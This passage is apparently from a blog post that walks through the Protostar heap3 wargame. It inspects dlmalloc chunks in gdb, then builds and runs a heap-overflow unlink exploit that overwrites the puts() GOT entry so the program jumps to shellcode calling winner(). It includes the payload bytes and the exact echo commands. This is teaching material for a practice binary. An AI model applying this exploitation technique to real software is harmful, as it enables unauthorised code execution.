-    0xb7fe0000 0xb7fe2000     0x2000          0
-    0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
-    0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
-    0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-    0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-    0xbffeb000 0xc0000000    0x15000          0           [stack]
-</code></pre>
-
-<p>The heap starts at <code>0x804c000</code>, ends at <code>0x804d000</code>, and has size <code>0x1000</code> or 4096 bytes. We can
-define hooks in gdb. We define one to examine the first 56 words of the heap in hexadecimal every
-time execution stops.</p>
-
-<pre><code>(gdb) define hook-stop
-Type commands for definition of "hook-stop".
-End with a line saying just "end".
-&gt;x/56wx 0x804c000
-&gt;end
-</code></pre>
-
-<p>If we continue, we hit the third malloc. At this point two <code>malloc()</code>&rsquo;s have been called.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000fb1  0x00000000  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
-3211    in common/malloc.c
-</code></pre>
-
-<p>The second word of the chunk up to the last three bits indicates the chunk size in bytes. <code>0x29</code> is
-<code>0b101001</code>. Without the last three bits it&rsquo;s <code>0b101000</code> which is 40. We can see the chunk starts at
-<code>0x804c000</code> and ends at <code>0x804c028</code> which is the start of the next chunk. This range encompasses
-10 words. Each word is 4 bytes which makes 10 * 4 = 40 bytes. The last bit of the size word
-indicates that the previous chunk is in use. By convention the first chunk has this bit turned on
-because there&rsquo;s no previous chunk that&rsquo;s free.</p>
-
-<p>The second chunk resulting from the second <code>malloc()</code> starts at <code>0x804c028</code> and ends at <code>0x804c050</code>.
-It&rsquo;s identical to the first chunk. Continue past the third <code>malloc()</code>.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 2, 0x08048750 in strcpy@plt ()
-</code></pre>
-
-<p>We see a third chunk is created. The number at the end (right now <code>0x00000f89</code>) indicates the
-remaining size of the heap. It has been decreasing. Continue past the first <code>strcpy()</code>.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 2, 0x08048750 in strcpy@plt ()
-</code></pre>
-
-<p>We see the the 12 <code>A</code>&rsquo;s (ASCII value 41) have been written to the heap. Continue two more times past
-the remaining two <code>strcpy()</code>&rsquo;s.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 2, 0x08048750 in strcpy@plt ()
-(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x43434343  0x43434343
-0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
-3583    in common/malloc.c
-</code></pre>
-
-<p>We see the 12 <code>B</code>&rsquo;s and <code>C</code>&rsquo;s being written to their respective chunks. We are now at the first
-<code>free()</code>. Continue again.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x42424242  0x42424242  0x42424242  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
-0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
-3583    in common/malloc.c
-</code></pre>
-
-<p>The first word of the third chunk&rsquo;s data at <code>0x804c058</code> has been zeroed out. Continue.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
-0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 3, free (mem=0x804c008) at common/malloc.c:3583
-3583    in common/malloc.c
-</code></pre>
-
-<p><code>0x804c030</code> now has <code>0x0804c050</code> which is a pointer to the start of the third chunk. This shows the
-second and third chunk are now tied together in a singly-linked list since they are small enough to
-be considered fastbins. Continue.</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
-0x804c010:  0x41414141  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x0804c050  0x42424242  0x42424242  0x00000000
-0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c050:  0x00000000  0x00000029  0x00000000  0x43434343
-0x804c060:  0x43434343  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0c0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 4, 0x08048790 in puts@plt ()
-</code></pre>
-
-<p>Now the first chunk has been freed and address <code>0x804c008</code> has a pointer <code>0x0804c028</code> to the second
-chunk. If we continue, the program runs the <code>printf("dynamite failed?\n");</code> line.</p>
-
-<pre><code>(gdb) c
-Continuing.
-dynamite failed?
-
-Program exited with code 021.
-0x804c000:  Error while running hook_stop:
-Cannot access memory at address 0x804c000
-</code></pre>
-
-<h2>Crafting the exploit</h2>
-
-<p>Let&rsquo;s work backwards. We can use <code>unlink()</code> to write the four byte address of a call to <code>winner()</code> to the GOT
-entry for <code>puts()</code>. Use <code>objdump</code> to find the address of <code>winner()</code>.</p>
-
-<pre><code>user@protostar:$ objdump -t /opt/protostar/bin/heap3 | grep winner
-08048864 g     F .text  00000025              winner
-</code></pre>
-
-<p>We can&rsquo;t just put <code>0x08048864</code> in the GOT entry at <code>0x804b128</code> (why?).
-In order to call <code>winner()</code>, we&rsquo;ll need to craft a payload that does so. Such a
-payload is often called &ldquo;<a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a>.&rdquo; The following assembly code will do.</p>
-
-<pre><code>mov eax, 0x8048864
-call eax
-</code></pre>
-
-<p>Using an <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">online x86 assembler</a>, the above in raw assembly is
-<code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. We can store this in the heap&rsquo;s first chunk whose data area starts
-at <code>0x804c008</code>. Now we want to write <code>0x804c008</code> into the GOT entry for <code>puts()</code> at <code>0x804b128</code>.
-Let&rsquo;s go back to the unlink statements.</p>
-
-<pre><code>BK = *(P + 12);
-FD = *(P + 8);
-*(FD + 12) = BK;
-*(BK + 8) = FD;
-</code></pre>
-
-<p><code>BK</code> is the address of <code>\xB8\x64\x88\x04\x08\xFF\xD0</code>. Where should we store that? Let&rsquo;s put it in
-the first chunk at <code>0x804c014</code>. The first chunk&rsquo;s data starts at <code>0x804c008</code>, but we&rsquo;ve seen the
-first byte is changed by dlmalloc when it&rsquo;s freed. We don&rsquo;t want our shellcode to be changed so we
-put it at a safe distance in the data at a +12-byte offset. 12 <code>A</code>&rsquo;s can pad the shellcode enough to
-push it 12-bytes into the heap. We have enough info to construct the first command line argument.</p>
-
-<pre><code>user@protostar:$ echo -en "AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0" &gt; /tmp/A
-</code></pre>
-
-<p>We&rsquo;ll store <code>FD</code> and <code>BK</code> in the third chunk. We can use the second command line argument to
-overwrite the size of the third chunk to be greater than 80 to trigger the <code>unlink()</code> macro when the
-third chunk is <code>free()</code>&rsquo;d. The second argument needs to have enough characters to overflow its
-chunk. The chunk&rsquo;s data starts at <code>0x804c030</code> and ends 32 bytes later at <code>0x804c050</code>. The third
-chunk&rsquo;s <code>size</code> is four bytes later at <code>0x804c054</code>. So we can use 32 + 4 = 36 characters as padding.
-Let&rsquo;s pick 100 as the size of the third chunk. 100 = 0x64. We also have to set the last bit to 1 to
-indicate the second or previous chunk is in use. So the third chunk&rsquo;s size should be <code>0x65</code>. So our
-second argument can have 36 <code>B</code>&rsquo;s as padding followed by <code>\x65</code>.</p>
-
-<pre><code>user@protostar:$ echo -en "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65" &gt; /tmp/B
-</code></pre>
-
-<p>Now we craft the third and final argument. The structure for it will be some padding + some four
-bytes to be determined + some size + <code>FD</code> + <code>BK</code>.</p>
-
-<p>The third chunk starts at <code>0x804c050</code>. It used to end 40 bytes later at <code>0x804c078</code>, but we
-overwrote its size to <code>0x65</code> or 100. So now it ends 100 bytes later at <code>0x804c0b4</code>. We want to
-trigger <code>unlink()</code> on the third chunk when we <code>free()</code> it. We&rsquo;ve already ensured it&rsquo;s not a fastbin
-by setting its size to be greater than 80 bytes. The next condition is to make dlmalloc consolidate
-this chunk with either the chunk before or after. Since we&rsquo;re using the previous chunk, let&rsquo;s fool
-dlmalloc into thinking the next chunk is free.</p>
-
-<p>I know what you&rsquo;re thinking. There&rsquo;s no fourth chunk. That&rsquo;s right, but we&rsquo;ll make dlmalloc think
-there is. In order to check a chunk is free, dlmalloc looks at the <code>PREV_INUSE</code> bit of the next
-chunk. To find the next chunk, dlmalloc adds the size of the current chunk to the current chunk&rsquo;s
-address. You can see this at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L3259">line 3259</a>.</p>
-
-<pre><code>if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
-</code></pre>
-
-<p><code>inuse_bit_at_offset()</code> is a macro defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1410-L1411">line 1410</a>.</p>
-
-<pre><code>#define inuse_bit_at_offset(p, s) \
-  (chunk_at_offset((p), (s))-&gt;size &amp; PREV_INUSE)
-</code></pre>
-
-<p><code>chunk_at_offset()</code> is defined at <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e#file-malloc-2-6-4-c-L1381">line 1381</a>.</p>
-
-<pre><code>#define chunk_at_offset(p, s)  BOUNDED_1((mchunkptr)(((char*)(p)) + (s)))
-</code></pre>
-
-<p>So let&rsquo;s write a small size at <code>0x804c0b8</code> to make dlmalloc think the fifth chunk is close by and so
-we don&rsquo;t have to add too much padding to our third argument. A size like <code>0x20</code>. We&rsquo;ll have to write
-it as <code>\x00\x00\x00\x20</code>. But we have a problem here. C treats <code>\x00</code> as the end of a string, and
-thus <code>strcpy()</code> will stop copying any string up to and including that <code>NUL</code>. We won&rsquo;t be able to add
-any more bytes after that. This means we cannot insert <code>\x00</code> in the middle of any of our inputs.</p>
-
-<p>But all is not lost. We want a small number for the fourth chunk&rsquo;s size. What&rsquo;s another way of
-summing to a small number, at least in the way computers represent integers? In non-modular
-arithmetic, the only way two integers can produce a small sum is if they themselves are smaller. In
-modular arithmetic, a small integer can be the sum of large numbers that are greater than the
-modulus.</p>
-
-<p>Take a closer look at how <code>chunk_at_offset()</code> is defined. It sums two numbers with no sanity checks.
-So we can write a really big number with no null bytes that <code>strcpy()</code> won&rsquo;t stop on and will make
-dlmalloc think the next fifth chunk is close by. Even better, we can use the first byte of the
-fourth chunk as the fifth chunk&rsquo;s size. How can we make dlmalloc think the fifth chunk is four bytes
-ahead of the fourth chunk? We do this with <code>0xfffffffc</code> which is -2 in two&rsquo;s complement for signed
-integers. So <code>0xfffffffc</code> at <code>0x804c0b8</code> will point to a fifth chunk&rsquo;s size four bytes earlier at
-<code>0x804c0b4</code>. This word&rsquo;s last bit must be set to 0 to indicate the fourth chunk is free. We can
-simply use <code>0xfffffffc</code> again here.</p>
-
-<p>We want <code>(FD + 12)</code> to equal <code>0x804b128</code>. So FD should be <code>0x804b128</code> - 12 = <code>0x804b11c</code>. In the above
-we decided to make <code>BK</code> <code>0x0804c014</code>. We have</p>
-
-<pre><code>user@protostar:/tmp$ echo -en "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08" &gt; /tmp/C
-</code></pre>
-
-<p>92 <code>C</code>&rsquo;s of padding, two <code>0xfffffffc</code> words, <code>FD</code>, followed by <code>BK</code>.</p>
-
-<h2>Checking it works</h2>
-
-<p>With the same gdb session as above, run the program with the three arguments.</p>
-
-<pre><code>(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
-0x804c000:  Error while running hook_stop:
-Cannot access memory at address 0x804c000
-
-Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
-3211    in common/malloc.c
-</code></pre>
-
-<p>Let&rsquo;s continue until we stop at the first <code>free()</code> call.</p>
-
-<pre><code>(gdb) c
-Continuing.
-...
-
-Breakpoint 3, free (mem=0x804c058) at common/malloc.c:3583
-3583    in common/malloc.c
-</code></pre>
-
-<p>Examine the GOT entry for <code>puts()</code>.</p>
-
-<pre><code>(gdb) x 0x804b128
-0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
-</code></pre>
-
-<p>Continue and see that <code>free(c)</code> has overwritten the contents to the address of our shellcode!</p>
-
-<pre><code>(gdb) c
-Continuing.
-0x804c000:  0x00000000  0x00000029  0x41414141  0x41414141
-0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
-0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
-0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-
-Breakpoint 3, free (mem=0x804c030) at common/malloc.c:3583
-3583    in common/malloc.c
-(gdb) x 0x804b128
-0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c014
-</code></pre>
-
-<p>Let the rest of the program run to see <code>winner()</code> is called.</p>
-
-<pre><code>Breakpoint 4, 0x08048790 in puts@plt ()
-(gdb) si
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
-0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
-0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
-0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
-0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x0804c014 in ?? ()
-(gdb) si
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
-0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
-0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
-0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
-0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x0804c019 in ?? ()
-(gdb) si
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
-0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
-0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
-0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
-0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-winner () at heap3/heap3.c:8
-8   heap3/heap3.c: No such file or directory.
-    in heap3/heap3.c
-(gdb) c
-Continuing.
-that wasn't too bad now, was it? @ 1587442625
-
-Program received signal SIGSEGV, Segmentation fault.
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x41414141
-0x804c010:  0x41414141  0x048864b8  0x00d0ff08  0x0804b11c
-0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-0x804c030:  0x00000000  0x42424242  0x42424242  0x42424242
-0x804c040:  0x42424242  0x42424242  0x42424242  0x42424242
-0x804c050:  0x42424242  0x00000061  0x0804b194  0x0804b194
-0x804c060:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c070:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c080:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c090:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0a0:  0x43434343  0x43434343  0x43434343  0x43434343
-0x804c0b0:  0x00000060  0xfffffffc  0xfffffffc  0x0804b11c
-0x804c0c0:  0x0804c014  0x00000000  0x00000000  0x00000000
-0x804c0d0:  0x00000000  0x00000000  0x00000000  0x00000000
-0x0804c01b in ?? ()
-</code></pre>
-
-<p>Now let&rsquo;s run it without gdb.</p>
-
-<pre><code>user@protostar:~$ /opt/protostar/bin/./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
-that wasn't too bad now, was it? @ 1587443061
-Segmentation fault
-</code></pre>
-
-<p>Amazing.</p>
-
-<h3>References</h3>
-
-<ul>
-<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
-<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
 </ul>
 
 ]]></content>
